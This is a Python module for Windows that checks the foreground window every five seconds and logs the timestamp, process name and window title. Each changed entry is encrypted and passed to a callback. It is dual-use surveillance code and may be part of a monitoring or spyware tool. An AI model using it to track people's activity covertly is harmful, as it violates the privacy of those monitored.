import time, win32gui, win32process, psutil
from datetime import datetime
from .crypto import encrypt_line

INTERVAL = 5

def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(hwnd)[1]
        process = psutil.Process(pid)
        return f"{datetime.now().isoformat()} | {process.name()} | {win32gui.GetWindowText(hwnd)}"
    except Exception as e:
        return f"{datetime.now().isoformat()} | Error retrieving window: {e}"

def log_active_window(callback):
    last = None
    while True:
        cur = get_active_window_title()
        if cur != last:
            callback(encrypt_line(cur))
            last = cur
        time.sleep(INTERVAL)
